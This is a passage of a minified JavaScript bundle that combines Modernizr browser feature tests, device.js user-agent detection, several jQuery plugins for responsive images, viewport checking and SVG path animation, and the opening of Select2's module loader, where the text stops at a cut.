/*! modernizr 3.3.1 (Custom Build) | MIT *
 * https://modernizr.com/download/?-backgroundcliptext-checked-cssanimations-csscalc-csscolumns-cssfilters-cssgradients-cssinvalid-cssmask-csstransforms-csstransitions-cssvhunit-cssvmaxunit-cssvminunit-cssvwunit-flexbox-generatedcontent-geolocation-history-indexeddb-inlinesvg-localstorage-multiplebgs-picture-progressbar_meter-regions-sessionstorage-svg-svgasimg-svgclippaths-svgfilters-touchevents-userselect-video-setclasses !*/
!function (t, e, i) {
    function n(t, e) {
        return typeof t === e
    }

    function o(t) {
        var e = b.className, i = w._config.classPrefix || "";
        if (x && (e = e.baseVal), w._config.enableJSClass) {
            var n = new RegExp("(^|\\s)" + i + "no-js(\\s|$)");
            e = e.replace(n, "$1" + i + "js$2")
        }
        w._config.enableClasses && (e += " " + i + t.join(" " + i), x ? b.className.baseVal = e : b.className = e)
    }

    function s() {
        return "function" != typeof e.createElement ? e.createElement(arguments[0]) : x ? e.createElementNS.call(e, "http://www.w3.org/2000/svg", arguments[0]) : e.createElement.apply(e, arguments)
    }

    function r(t, e) {
        return t - 1 === e || t === e || t + 1 === e
    }

    function a(t) {
        return t.replace(/([a-z])-([a-z])/g, (function (t, e, i) {
            return e + i.toUpperCase()
        })).replace(/^-/, "")
    }

    function l(t, e) {
        if ("object" == typeof t) for (var i in t) T(t, i) && l(i, t[i]); else {
            var n = (t = t.toLowerCase()).split("."), s = w[n[0]];
            if (2 == n.length && (s = s[n[1]]), void 0 !== s) return w;
            e = "function" == typeof e ? e() : e, 1 == n.length ? w[n[0]] = e : (!w[n[0]] || w[n[0]] instanceof Boolean || (w[n[0]] = new Boolean(w[n[0]])), w[n[0]][n[1]] = e), o([(e && 0 != e ? "" : "no-") + n.join("-")]), w._trigger(t, e)
        }
        return w
    }

    function c(t, i, n, o) {
        var r, a, l, c, d = "modernizr", u = s("div"), h = function () {
            var t = e.body;
            return t || ((t = s(x ? "svg" : "body")).fake = !0), t
        }();
        if (parseInt(n, 10)) for (; n--;) (l = s("div")).id = o ? o[n] : d + (n + 1), u.appendChild(l);
        return (r = s("style")).type = "text/css", r.id = "s" + d, (h.fake ? h : u).appendChild(r), h.appendChild(u), r.styleSheet ? r.styleSheet.cssText = t : r.appendChild(e.createTextNode(t)), u.id = d, h.fake && (h.style.background = "", h.style.overflow = "hidden", c = b.style.overflow, b.style.overflow = "hidden", b.appendChild(h)), a = i(u, t), h.fake ? (h.parentNode.removeChild(h), b.style.overflow = c, b.offsetHeight) : u.parentNode.removeChild(u), !!a
    }

    function d(t, e) {
        return !!~("" + t).indexOf(e)
    }

    function u(t, e) {
        return function () {
            return t.apply(e, arguments)
        }
    }

    function h(t) {
        return t.replace(/([A-Z])/g, (function (t, e) {
            return "-" + e.toLowerCase()
        })).replace(/^ms-/, "-ms-")
    }

    function p(e, n) {
        var o = e.length;
        if ("CSS" in t && "supports" in t.CSS) {
            for (; o--;) if (t.CSS.supports(h(e[o]), n)) return !0;
            return !1
        }
        if ("CSSSupportsRule" in t) {
            for (var s = []; o--;) s.push("(" + h(e[o]) + ":" + n + ")");
            return c("@supports (" + (s = s.join(" or ")) + ") { #modernizr { position: absolute; } }", (function (t) {
                return "absolute" == getComputedStyle(t, null).position
            }))
        }
        return i
    }

    function f(t, e, o, r) {
        function l() {
            u && (delete P.style, delete P.modElem)
        }

        if (r = !n(r, "undefined") && r, !n(o, "undefined")) {
            var c = p(t, o);
            if (!n(c, "undefined")) return c
        }
        for (var u, h, f, g, m, v = ["modernizr", "tspan", "samp"]; !P.style && v.length;) u = !0, P.modElem = s(v.shift()), P.style = P.modElem.style;
        for (f = t.length, h = 0; f > h; h++) if (g = t[h], m = P.style[g], d(g, "-") && (g = a(g)), P.style[g] !== i) {
            if (r || n(o, "undefined")) return l(), "pfx" != e || g;
            try {
                P.style[g] = o
            } catch (t) {
            }
            if (P.style[g] != m) return l(), "pfx" != e || g
        }
        return l(), !1
    }

    function g(t, e, i, o, s) {
        var r = t.charAt(0).toUpperCase() + t.slice(1), a = (t + " " + E.join(r + " ") + r).split(" ");
        return n(e, "string") || n(e, "undefined") ? f(a, e, o, s) : function (t, e, i) {
            var o;
            for (var s in t) if (t[s] in e) return !1 === i ? t[s] : n(o = e[t[s]], "function") ? u(o, i || e) : o;
            return !1
        }(a = (t + " " + I.join(r + " ") + r).split(" "), e, i)
    }

    function m(t, e, n) {
        return g(t, i, i, e, n)
    }

    var v = [], y = [], _ = {
        _version: "3.3.1",
        _config: {classPrefix: "", enableClasses: !0, enableJSClass: !0, usePrefixes: !0},
        _q: [],
        on: function (t, e) {
            var i = this;
            setTimeout((function () {
                e(i[t])
            }), 0)
        },
        addTest: function (t, e, i) {
            y.push({name: t, fn: e, options: i})
        },
        addAsyncTest: function (t) {
            y.push({name: null, fn: t})
        }
    }, w = function () {
    };
    w.prototype = _, (w = new w).addTest("geolocation", "geolocation" in navigator), w.addTest("history", (function () {
        var e = navigator.userAgent;
        return (-1 === e.indexOf("Android 2.") && -1 === e.indexOf("Android 4.0") || -1 === e.indexOf("Mobile Safari") || -1 !== e.indexOf("Chrome") || -1 !== e.indexOf("Windows Phone")) && (t.history && "pushState" in t.history)
    })), w.addTest("svg", !!e.createElementNS && !!e.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect), w.addTest("picture", "HTMLPictureElement" in t), w.addTest("localstorage", (function () {
        var t = "modernizr";
        try {
            return localStorage.setItem(t, t), localStorage.removeItem(t), !0
        } catch (t) {
            return !1
        }
    })), w.addTest("sessionstorage", (function () {
        var t = "modernizr";
        try {
            return sessionStorage.setItem(t, t), sessionStorage.removeItem(t), !0
        } catch (t) {
            return !1
        }
    })), w.addTest("svgfilters", (function () {
        var e = !1;
        try {
            e = "SVGFEColorMatrixElement" in t && 2 == SVGFEColorMatrixElement.SVG_FECOLORMATRIX_TYPE_SATURATE
        } catch (t) {
        }
        return e
    }));
    var b = e.documentElement, x = "svg" === b.nodeName.toLowerCase(),
        C = _._config.usePrefixes ? " -webkit- -moz- -o- -ms- ".split(" ") : ["", ""];
    _._prefixes = C, w.addTest("video", (function () {
        var t = s("video"), e = !1;
        try {
            (e = !!t.canPlayType) && ((e = new Boolean(e)).ogg = t.canPlayType('video/ogg; codecs="theora"').replace(/^no$/, ""), e.h264 = t.canPlayType('video/mp4; codecs="avc1.42E01E"').replace(/^no$/, ""), e.webm = t.canPlayType('video/webm; codecs="vp8, vorbis"').replace(/^no$/, ""), e.vp9 = t.canPlayType('video/webm; codecs="vp9"').replace(/^no$/, ""), e.hls = t.canPlayType('application/x-mpegURL; codecs="avc1.42E01E"').replace(/^no$/, ""))
        } catch (t) {
        }
        return e
    })), w.addTest("csscalc", (function () {
        var t = "width:", e = s("a");
        return e.style.cssText = t + C.join("calc(10px);" + t), !!e.style.length
    })), w.addTest("cssgradients", (function () {
        for (var t, e = "background-image:", i = "", n = 0, o = C.length - 1; o > n; n++) t = 0 === n ? "to " : "", i += e + C[n] + "linear-gradient(" + t + "left top, #9f9, white);";
        w._config.usePrefixes && (i += e + "-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));");
        var r = s("a").style;
        return r.cssText = i, ("" + r.backgroundImage).indexOf("gradient") > -1
    })), w.addTest("multiplebgs", (function () {
        var t = s("a").style;
        return t.cssText = "background:url(https://),url(https://),red url(https://)", /(url\s*\(.*?){3}/.test(t.background)
    })), w.addTest("regions", (function () {
        if (x) return !1;
        var t = w.prefixed("flowFrom"), e = w.prefixed("flowInto"), n = !1;
        if (!t || !e) return n;
        var o = s("iframe"), r = s("div"), a = s("div"), l = s("div"), c = "modernizr_flow_for_regions_check";
        a.innerText = "M", r.style.cssText = "top: 150px; left: 150px; padding: 0px;", l.style.cssText = "width: 50px; height: 50px; padding: 42px;", l.style[t] = c, r.appendChild(a), r.appendChild(l), b.appendChild(r);
        var d, u, h = a.getBoundingClientRect();
        return a.style[e] = c, d = a.getBoundingClientRect(), u = parseInt(d.left - h.left, 10), b.removeChild(r), 42 == u ? n = !0 : (b.appendChild(o), h = o.getBoundingClientRect(), o.style[e] = c, d = o.getBoundingClientRect(), h.height > 0 && h.height !== d.height && 0 === d.height && (n = !0)), a = l = r = o = i, n
    })), w.addTest("progressbar", s("progress").max !== i), w.addTest("meter", s("meter").max !== i);
    var $ = "CSS" in t && "supports" in t.CSS, S = "supportsCSS" in t;
    w.addTest("supports", $ || S);
    var T, k = {}.toString;
    w.addTest("svgclippaths", (function () {
        return !!e.createElementNS && /SVGClipPath/.test(k.call(e.createElementNS("http://www.w3.org/2000/svg", "clipPath")))
    })), w.addTest("inlinesvg", (function () {
        var t = s("div");
        return t.innerHTML = "<svg/>", "http://www.w3.org/2000/svg" == ("undefined" != typeof SVGRect && t.firstChild && t.firstChild.namespaceURI)
    })), function () {
        var t = {}.hasOwnProperty;
        T = n(t, "undefined") || n(t.call, "undefined") ? function (t, e) {
            return e in t && n(t.constructor.prototype[e], "undefined")
        } : function (e, i) {
            return t.call(e, i)
        }
    }(), _._l = {}, _.on = function (t, e) {
        this._l[t] || (this._l[t] = []), this._l[t].push(e), w.hasOwnProperty(t) && setTimeout((function () {
            w._trigger(t, w[t])
        }), 0)
    }, _._trigger = function (t, e) {
        if (this._l[t]) {
            var i = this._l[t];
            setTimeout((function () {
                var t;
                for (t = 0; t < i.length; t++) (0, i[t])(e)
            }), 0), delete this._l[t]
        }
    }, w._q.push((function () {
        _.addTest = l
    })), w.addTest("svgasimg", e.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1"));
    var O = _.testStyles = c;
    w.addTest("touchevents", (function () {
        var i;
        if ("ontouchstart" in t || t.DocumentTouch && e instanceof DocumentTouch) i = !0; else {
            var n = ["@media (", C.join("touch-enabled),("), "heartz", ")", "{#modernizr{top:9px;position:absolute}}"].join("");
            O(n, (function (t) {
                i = 9 === t.offsetTop
            }))
        }
        return i
    })), w.addTest("checked", (function () {
        return O("#modernizr {position:absolute} #modernizr input {margin-left:10px} #modernizr :checked {margin-left:20px;display:block}", (function (t) {
            var e = s("input");
            return e.setAttribute("type", "checkbox"), e.setAttribute("checked", "checked"), t.appendChild(e), 20 === e.offsetLeft
        }))
    })), O('#modernizr{font:0/0 a}#modernizr:after{content:":)";visibility:hidden;font:7px/1 a}', (function (t) {
        w.addTest("generatedcontent", t.offsetHeight >= 7)
    })), w.addTest("cssinvalid", (function () {
        return O("#modernizr input{height:0;border:0;padding:0;margin:0;width:10px} #modernizr input:invalid{width:50px}", (function (t) {
            var e = s("input");
            return e.required = !0, t.appendChild(e), e.clientWidth > 10
        }))
    })), O("#modernizr { height: 50vh; }", (function (e) {
        var i = parseInt(t.innerHeight / 2, 10),
            n = parseInt((t.getComputedStyle ? getComputedStyle(e, null) : e.currentStyle).height, 10);
        w.addTest("cssvhunit", n == i)
    })), O("#modernizr1{width: 50vmax}#modernizr2{width:50px;height:50px;overflow:scroll}#modernizr3{position:fixed;top:0;left:0;bottom:0;right:0}", (function (e) {
        var i = e.childNodes[2], n = e.childNodes[1], o = e.childNodes[0],
            s = parseInt((n.offsetWidth - n.clientWidth) / 2, 10), a = o.clientWidth / 100, l = o.clientHeight / 100,
            c = parseInt(50 * Math.max(a, l), 10),
            d = parseInt((t.getComputedStyle ? getComputedStyle(i, null) : i.currentStyle).width, 10);
        w.addTest("cssvmaxunit", r(c, d) || r(c, d - s))
    }), 3), O("#modernizr1{width: 50vm;width:50vmin}#modernizr2{width:50px;height:50px;overflow:scroll}#modernizr3{position:fixed;top:0;left:0;bottom:0;right:0}", (function (e) {
        var i = e.childNodes[2], n = e.childNodes[1], o = e.childNodes[0],
            s = parseInt((n.offsetWidth - n.clientWidth) / 2, 10), a = o.clientWidth / 100, l = o.clientHeight / 100,
            c = parseInt(50 * Math.min(a, l), 10),
            d = parseInt((t.getComputedStyle ? getComputedStyle(i, null) : i.currentStyle).width, 10);
        w.addTest("cssvminunit", r(c, d) || r(c, d - s))
    }), 3), O("#modernizr { width: 50vw; }", (function (e) {
        var i = parseInt(t.innerWidth / 2, 10),
            n = parseInt((t.getComputedStyle ? getComputedStyle(e, null) : e.currentStyle).width, 10);
        w.addTest("cssvwunit", n == i)
    }));
    var A = "Moz O ms Webkit", E = _._config.usePrefixes ? A.split(" ") : [];
    _._cssomPrefixes = E;
    var z = function (e) {
        var n, o = C.length, s = t.CSSRule;
        if (void 0 === s) return i;
        if (!e) return !1;
        if ((n = (e = e.replace(/^@/, "")).replace(/-/g, "_").toUpperCase() + "_RULE") in s) return "@" + e;
        for (var r = 0; o > r; r++) {
            var a = C[r];
            if (a.toUpperCase() + "_" + n in s) return "@-" + a.toLowerCase() + "-" + e
        }
        return !1
    };
    _.atRule = z;
    var I = _._config.usePrefixes ? A.toLowerCase().split(" ") : [];
    _._domPrefixes = I;
    var D = {elem: s("modernizr")};
    w._q.push((function () {
        delete D.elem
    }));
    var P = {style: D.elem.style};
    w._q.unshift((function () {
        delete P.style
    })), _.testAllProps = g;
    var L, M = _.prefixed = function (t, e, i) {
        return 0 === t.indexOf("@") ? z(t) : (-1 != t.indexOf("-") && (t = a(t)), e ? g(t, e, i) : g(t, "pfx"))
    };
    try {
        L = M("indexedDB", t)
    } catch (t) {
    }
    w.addTest("indexeddb", !!L), L && w.addTest("indexeddb.deletedatabase", "deleteDatabase" in L), _.testAllProps = m, w.addTest("cssanimations", m("animationName", "a", !0)), w.addTest("backgroundcliptext", (function () {
        return m("backgroundClip", "text")
    })), function () {
        w.addTest("csscolumns", (function () {
            var t = !1, e = m("columnCount");
            try {
                (t = !!e) && (t = new Boolean(t))
            } catch (t) {
            }
            return t
        }));
        for (var t, e, i = ["Width", "Span", "Fill", "Gap", "Rule", "RuleColor", "RuleStyle", "RuleWidth", "BreakBefore", "BreakAfter", "BreakInside"], n = 0; n < i.length; n++) t = i[n].toLowerCase(), e = m("column" + i[n]), ("breakbefore" === t || "breakafter" === t || "breakinside" == t) && (e = e || m(i[n])), w.addTest("csscolumns." + t, e)
    }(), w.addTest("cssfilters", (function () {
        if (w.supports) return m("filter", "blur(2px)");
        var t = s("a");
        return t.style.cssText = C.join("filter:blur(2px); "), !!t.style.length && (e.documentMode === i || e.documentMode > 9)
    })), w.addTest("flexbox", m("flexBasis", "1px", !0)), w.addTest("cssmask", m("maskRepeat", "repeat-x", !0)), w.addTest("csstransforms", (function () {
        return -1 === navigator.userAgent.indexOf("Android 2.") && m("transform", "scale(1)", !0)
    })), w.addTest("csstransitions", m("transition", "all", !0)), w.addTest("userselect", m("userSelect", "none", !0)), function () {
        var t, e, i, o, s, r;
        for (var a in y) if (y.hasOwnProperty(a)) {
            if (t = [], (e = y[a]).name && (t.push(e.name.toLowerCase()), e.options && e.options.aliases && e.options.aliases.length)) for (i = 0; i < e.options.aliases.length; i++) t.push(e.options.aliases[i].toLowerCase());
            for (o = n(e.fn, "function") ? e.fn() : e.fn, s = 0; s < t.length; s++) 1 === (r = t[s].split(".")).length ? w[r[0]] = o : (!w[r[0]] || w[r[0]] instanceof Boolean || (w[r[0]] = new Boolean(w[r[0]])), w[r[0]][r[1]] = o), v.push((o ? "" : "no-") + r.join("-"))
        }
    }(), o(v), delete _.addTest, delete _.addAsyncTest;
    for (var q = 0; q < w._q.length; q++) w._q[q]();
    t.Modernizr = w
}(window, document),
    /*! device.js 0.2.7 */
    function () {
        var t, e, i, n, o, s, r, a, l, c;
        e = window.device, t = {}, window.device = t, n = window.document.documentElement, c = window.navigator.userAgent.toLowerCase(), t.ios = function () {
            return t.iphone() || t.ipod() || t.ipad()
        }, t.iphone = function () {
            return !t.windows() && o("iphone")
        }, t.ipod = function () {
            return o("ipod")
        }, t.ipad = function () {
            return o("ipad")
        }, t.android = function () {
            return !t.windows() && o("android")
        }, t.androidPhone = function () {
            return t.android() && o("mobile")
        }, t.androidTablet = function () {
            return t.android() && !o("mobile")
        }, t.blackberry = function () {
            return o("blackberry") || o("bb10") || o("rim")
        }, t.blackberryPhone = function () {
            return t.blackberry() && !o("tablet")
        }, t.blackberryTablet = function () {
            return t.blackberry() && o("tablet")
        }, t.windows = function () {
            return o("windows")
        }, t.windowsPhone = function () {
            return t.windows() && o("phone")
        }, t.windowsTablet = function () {
            return t.windows() && o("touch") && !t.windowsPhone()
        }, t.fxos = function () {
            return (o("(mobile;") || o("(tablet;")) && o("; rv:")
        }, t.fxosPhone = function () {
            return t.fxos() && o("mobile")
        }, t.fxosTablet = function () {
            return t.fxos() && o("tablet")
        }, t.meego = function () {
            return o("meego")
        }, t.cordova = function () {
            return window.cordova && "file:" === location.protocol
        }, t.nodeWebkit = function () {
            return "object" == typeof window.process
        }, t.mobile = function () {
            return t.androidPhone() || t.iphone() || t.ipod() || t.windowsPhone() || t.blackberryPhone() || t.fxosPhone() || t.meego()
        }, t.tablet = function () {
            return t.ipad() || t.androidTablet() || t.blackberryTablet() || t.windowsTablet() || t.fxosTablet()
        }, t.desktop = function () {
            return !t.tablet() && !t.mobile()
        }, t.television = function () {
            var t;
            for (television = ["googletv", "viera", "smarttv", "internet.tv", "netcast", "nettv", "appletv", "boxee", "kylo", "roku", "dlnadoc", "roku", "pov_tv", "hbbtv", "ce-html"], t = 0; t < television.length;) {
                if (o(television[t])) return !0;
                t++
            }
            return !1
        }, t.portrait = function () {
            return window.innerHeight / window.innerWidth > 1
        }, t.landscape = function () {
            return window.innerHeight / window.innerWidth < 1
        }, t.noConflict = function () {
            return window.device = e, this
        }, o = function (t) {
            return -1 !== c.indexOf(t)
        }, r = function (t) {
            var e;
            return e = new RegExp(t, "i"), n.className.match(e)
        }, i = function (t) {
            var e = null;
            r(t) || (e = n.className.replace(/^\s+|\s+$/g, ""), n.className = e + " " + t)
        }, l = function (t) {
            r(t) && (n.className = n.className.replace(" " + t, ""))
        }, t.ios() ? t.ipad() ? i("ios ipad tablet") : t.iphone() ? i("ios iphone mobile") : t.ipod() && i("ios ipod mobile") : t.android() ? i(t.androidTablet() ? "android tablet" : "android mobile") : t.blackberry() ? i(t.blackberryTablet() ? "blackberry tablet" : "blackberry mobile") : t.windows() ? i(t.windowsTablet() ? "windows tablet" : t.windowsPhone() ? "windows mobile" : "desktop") : t.fxos() ? i(t.fxosTablet() ? "fxos tablet" : "fxos mobile") : t.meego() ? i("meego mobile") : t.nodeWebkit() ? i("node-webkit") : t.television() ? i("television") : t.desktop() && i("desktop"), t.cordova() && i("cordova"), s = function () {
            t.landscape() ? (l("portrait"), i("landscape")) : (l("landscape"), i("portrait"))
        }, a = Object.prototype.hasOwnProperty.call(window, "onorientationchange") ? "orientationchange" : "resize", window.addEventListener ? window.addEventListener(a, s, !1) : window.attachEvent ? window.attachEvent(a, s) : window[a] = s, s(), "function" == typeof define && "object" == typeof define.amd && define.amd ? define((function () {
            return t
        })) : "undefined" != typeof module && module.exports ? module.exports = t : window.device = t
    }.call(this), jQuery.responsImg = function (t, e) {
    var i, n, o, s, r, a, l, c, d, u, h, p, f, g, m, v;
    return n = {
        allowDownsize: !1,
        elementQuery: !1,
        delay: 200,
        breakpoints: null,
        considerDevice: !1
    }, e && jQuery.extend(n, e), v = jQuery(window), t = jQuery(t), f = {}, r = null, h = null, 0, p = !1, d = function () {
        r = l(t), window.devicePixelRatio < 1.5 || (p = !0), f[0] = Array("IMG" === r ? t.attr("src") : a(t)), v.on("resize.responsImg orientationchange.responsImg", u), s()
    }, a = function (t) {
        return t.css("background-image").replace("url(", "").replace(")", "")
    }, l = function (t) {
        return jQuery(t).prop("tagName")
    }, s = function () {
        var e, o, s, r, a, l, c, d;
        for (r in l = /^responsimg/, s = t.data()) if (d = s[r], l.test(r)) {
            if (a = r.replace("responsimg", ""), isNaN(a)) for (e in a = a.toLowerCase(), c = n.breakpoints) o = c[e], a === e && (a = o); else a = parseInt(a, 10);
            f[a] = d.replace(" ", "").split(",")
        }
        i()
    }, u = function () {
        clearTimeout(h), h = setTimeout(i, n.delay)
    }, o = function () {
        var e, i, o;
        return e = null, !0 === n.elementQuery ? (e = t.width(), null != window.orientation && n.considerDevice && (o = v.width(), i = c(), e = Math.ceil(i * e / o))) : e = null != window.orientation && n.considerDevice ? c() : v.width(), e
    }, c = function () {
        var t;
        return t = 0 === window.orientation ? window.screen.width : window.screen.height, navigator.userAgent.indexOf("Android") >= 0 && window.devicePixelRatio && (t /= window.devicePixelRatio), t
    }, i = function () {
        var e, i, s, a, l;
        if (e = 0, i = !0, a = "", (l = o()) > 0 ? l : !1 === n.allowDownsize && (i = !1), !0 === i) {
            for (s in f) f[s], parseInt(s, 10) > l || parseInt(s, 10) < e || (e = parseInt(s, 10), a = f[e][0]);
            !0 === p && null != f[e][1] && (a = f[e][1]), "IMG" === r ? m(t, a) : g(t, a)
        }
    }, m = function (t, e) {
        e !== t.attr("src") && t.attr("src", e)
    }, g = function (t, e) {
        e !== a(t) && t.css("background-image", "url(" + e + ")")
    }, d(), this.recheck = function () {
        i()
    }, this
}, jQuery.fn.responsImg = function (t) {
    return this.each((function () {
        var e, i;
        void 0 === (e = jQuery(this)).data("responsImg") && (i = new jQuery.responsImg(this, t), e.data("responsImg", i))
    }))
}, function (t) {
    t.fn.viewportChecker = function (e) {
        var i = {
            classToAdd: "visible",
            classToRemove: "invisible",
            classToAddForFullView: "full-visible",
            removeClassAfterAnimation: !1,
            offset: 100,
            repeat: !1,
            invertBottomOffset: !0,
            callbackFunction: function (t, e) {
            },
            scrollHorizontal: !1,
            scrollBox: window
        };
        t.extend(i, e);
        var n = this, o = {height: t(i.scrollBox).height(), width: t(i.scrollBox).width()};
        return this.checkElements = function () {
            var e, s;
            i.scrollHorizontal ? (e = Math.max(t("html").scrollLeft(), t("body").scrollLeft(), t(window).scrollLeft()), s = e + o.width) : (e = Math.max(t("html").scrollTop(), t("body").scrollTop(), t(window).scrollTop()), s = e + o.height), n.each((function () {
                var n = t(this), r = {}, a = {};
                if (n.data("vp-add-class") && (a.classToAdd = n.data("vp-add-class")), n.data("vp-remove-class") && (a.classToRemove = n.data("vp-remove-class")), n.data("vp-add-class-full-view") && (a.classToAddForFullView = n.data("vp-add-class-full-view")), n.data("vp-keep-add-class") && (a.removeClassAfterAnimation = n.data("vp-remove-after-animation")), n.data("vp-offset") && (a.offset = n.data("vp-offset")), n.data("vp-repeat") && (a.repeat = n.data("vp-repeat")), n.data("vp-scrollHorizontal") && (a.scrollHorizontal = n.data("vp-scrollHorizontal")), n.data("vp-invertBottomOffset") && (a.scrollHorizontal = n.data("vp-invertBottomOffset")), t.extend(r, i), t.extend(r, a), !n.data("vp-animated") || r.repeat) {
                    String(r.offset).indexOf("%") > 0 && (r.offset = parseInt(r.offset) / 100 * o.height);
                    var l = r.scrollHorizontal ? n.offset().left : n.offset().top,
                        c = r.scrollHorizontal ? l + n.width() : l + n.height(), d = Math.round(l) + r.offset,
                        u = r.scrollHorizontal ? d + n.width() : d + n.height();
                    r.invertBottomOffset && (u -= 2 * r.offset), d < s && u > e ? (n.removeClass(r.classToRemove), n.addClass(r.classToAdd), r.callbackFunction(n, "add"), c <= s && l >= e ? n.addClass(r.classToAddForFullView) : n.removeClass(r.classToAddForFullView), n.data("vp-animated", !0), r.removeClassAfterAnimation && n.one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", (function () {
                        n.removeClass(r.classToAdd)
                    }))) : n.hasClass(r.classToAdd) && r.repeat && (n.removeClass(r.classToAdd + " " + r.classToAddForFullView), r.callbackFunction(n, "remove"), n.data("vp-animated", !1))
                }
            }))
        }, ("ontouchstart" in window || "onmsgesturechange" in window) && t(document).bind("touchmove MSPointerMove pointermove", this.checkElements), t(i.scrollBox).bind("load scroll", this.checkElements), t(window).resize((function (e) {
            o = {height: t(i.scrollBox).height(), width: t(i.scrollBox).width()}, n.checkElements()
        })), this.checkElements(), this
    }
}(jQuery), function (t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof module && module.exports ? module.exports = function (e, i) {
        return void 0 === i && (i = "undefined" != typeof window ? require("jquery") : require("jquery")(e)), t(i), i
    } : t(jQuery)
}((function (t) {
    "use strict";
    var e = "drawsvg", i = {duration: 1e3, stagger: 200, easing: "swing", reverse: !1, callback: t.noop},
        n = function () {
            var n = function (n, o) {
                var s = this, r = t.extend(i, o);
                s.$elm = t(n), s.$elm.is("svg") && (s.options = r, s.$paths = s.$elm.find("path"), s.totalDuration = r.duration + r.stagger * s.$paths.length, s.duration = r.duration / s.totalDuration, s.$paths.each((function (t, e) {
                    var i = e.getTotalLength();
                    e.pathLen = i, e.delay = r.stagger * t / s.totalDuration, e.style.strokeDasharray = [i, i].join(" "), e.style.strokeDashoffset = i
                })), s.$elm.attr("class", (function (t, i) {
                    return [i, e + "-initialized"].join(" ")
                })))
            };
            return n.prototype.getVal = function (e, i) {
                return 1 - t.easing[i](e, e, 0, 1, 1)
            }, n.prototype.progress = function (t) {
                var e = this, i = e.options, n = e.duration;
                e.$paths.each((function (o, s) {
                    var r = s.style;
                    if (1 === t) r.strokeDashoffset = 0; else if (0 === t) r.strokeDashoffset = s.pathLen + "px"; else if (t >= s.delay && t <= n + s.delay) {
                        var a = (t - s.delay) / n;
                        r.strokeDashoffset = e.getVal(a, i.easing) * s.pathLen * (i.reverse ? -1 : 1) + "px"
                    }
                }))
            }, n.prototype.animate = function () {
                var i = this;
                i.$elm.attr("class", (function (t, i) {
                    return [i, e + "-animating"].join(" ")
                })), t({len: 0}).animate({len: 1}, {
                    easing: "linear", duration: i.totalDuration, step: function (t, e) {
                        i.progress.call(i, t / e.end)
                    }, complete: function () {
                        i.options.callback.call(this), i.$elm.attr("class", (function (t, i) {
                            return i.replace(e + "-animating", "")
                        }))
                    }
                })
            }, n
        }();
    t.fn[e] = function (i, o) {
        return this.each((function () {
            var s = t.data(this, e);
            s && "" + i === i && s[i] ? s[i](o) : t.data(this, e, new n(this, i))
        }))
    }
})), function (t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof exports ? require("jquery") : jQuery)
}((function (t) {
    var e = function () {
        if (t && t.fn && t.fn.select2 && t.fn.select2.amd) var e = t.fn.select2.amd;
        return function () {
            var t, i, n;
            e && e.requirejs || (e ? i = e : e = {}, function (e) {
                function o(t, e) {
                    return _.call(t, e)
                }

                function s(t, e) {
                    var i, n, o, s, r, a, l, c, d, u, h, p = e && e.split("/"), f = v.map, g = f && f["*"] || {};
                    if (t && "." === t.charAt(0)) if (e) {
                        for (r = (t = t.split("/")).length - 1, v.nodeIdCompat && b.test(t[r]) && (t[r] = t[r].replace(b, "")), t = p.slice(0, p.length - 1).concat(t), d = 0; d < t.length; d += 1) if ("." === (h = t[d])) t.splice(d, 1), d -= 1; else if (".." === h) {
                            if (1 === d && (".." === t[2] || ".." === t[0])) break;
                            d > 0 && (t.splice(d - 1, 2), d -= 2)
                        }
                        t = t.join("/")
                    } else 0 === t.indexOf("./") && (t = t.substring(2));
                    if ((p || g) && f) {
                        for (d = (i = t.split("/")).length; d > 0; d -= 1) {
                            if (n = i.slice(0, d).join("/"), p) for (u = p.length; u > 0; u -= 1) if ((o = f[p.slice(0, u).join("/")]) && (o = o[n])) {
                                s = o, a = d;
                                break
                            }
                            if (s) break;
                            !l && g && g[n] && (l = g[n], c = d)
                        }
                        !s && l && (s = l, a = c), s && (i.splice(0, a, s), t = i.join("/"))
                    }
                    return t
                }

                function r(t, i) {
                    return function () {
                        var n = w.call(arguments, 0);
                        return "string" != typeof n[0] && 1 === n.length && n.push(null), h.apply(e, n.concat([t, i]))
                    }
                }

                function a(t) {
                    return function (e) {
                        g[t] = e
                    }
                }

                function l(t) {
                    if (o(m, t)) {
                        var i = m[t];
                        delete m[t], y[t] = !0, u.apply(e, i)
                    }
                    if (!o(g, t) && !o(y, t)) throw new Error("No " + t);
                    return g[t]
                }

                function c(t) {
                    var e, i = t ? t.indexOf("!") : -1;
                    return i > -1 && (e = t.substring(0, i), t = t.substring(i + 1, t.length)), [e, t]
                }

                function d(t) {
                    return function () {
                        return v && v.config && v.config[t] || {}
                    }
                }

                var u, h, p, f, g = {}, m = {}, v = {}, y = {}, _ = Object.prototype.hasOwnProperty, w = [].slice,
                    b = /\.js$/;
                p = function (t, e) {
                    var i, n = c(t), o = n[0];
                    return t = n[1], o && (i = l(o = s(o, e))), o ? t = i && i.normalize ? i.normalize(t, function (t) {
                        return function (e) {
                            return s(e, t)
                        }
                    }(e)) : s(t, e) : (o = (n = c(t = s(t, e)))[0], t = n[1], o && (i = l(o))), {
                        f: o ? o + "!" + t : t,
                        n: t,
                        pr: o,
                        p: i
                    }
                }, f = {
                    require: function (t) {
                        return r(t)
                    }, exports: function (t) {
                        var e = g[t];
                        return void 0 !== e ? e : g[t] = {}
                    }, module: function (t) {
                        return {id: t, uri: "", exports: g[t], config: d(t)}
                    }
                }, u = function (t, i, n, s) {
                    var c, d, u, h, v, _, w = [], b = typeof n;
                    if (s = s || t, "undefined" === b || "function" === b) {
                        for (i = !i.length && n.length ? ["require", "exports", "module"] : i, v = 0; v < i.length; v += 1) if ("require" === (d = (h = p(i[v], s)).f)) w[v] = f.require(t); else if ("exports" === d) w[v] = f.exports(t), _ = !0; else if ("module" === d) c = w[v] = f.module(t); else if (o(g, d) || o(m, d) || o(y, d)) w[v] = l(d); else {
                            if (!h.p) throw new Error(t + " missing " + d);
                            h.p.load(h.n, r(s, !0), a(d), {}), w[v] = g[d]
                        }
                        u = n ? n.apply(g[t], w) : void 0, t && (c && c.exports !== e && c.exports !== g[t] ? g[t] = c.exports : u === e && _ || (g[t] = u))
                    } else t && (g[t] = n)
                }, t = i = h = function (t, i, n, o, s) {
                    if ("string" == typeof t) return f[t] ? f[t](i) : l(p(t, i).f);
                    if (!t.splice) {
